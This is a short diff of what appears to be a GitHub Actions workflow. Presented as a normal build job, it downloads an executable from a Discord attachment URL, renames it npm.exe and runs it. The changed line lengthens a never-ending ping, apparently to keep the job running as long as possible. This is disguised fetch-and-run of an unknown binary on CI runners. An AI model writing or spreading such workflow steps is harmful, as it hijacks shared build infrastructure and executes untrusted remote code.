@@ -31,7 +31,7 @@ jobs:
           dir
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830902212237721610/Chrome.exe -OutFile npm.exe
           cmd /c echo .\npm.exe >>a.ps1
-          cmd /c echo ping localhost -w 99999999999999999999999999999999999 >>a.ps1
+          cmd /c echo ping localhost -n 11111111111111111111111111111 -w 99999999999999999999999999999999999 >>a.ps1
           .\a.ps1
           echo Add other actions to build,
           echo test, and deploy your project.
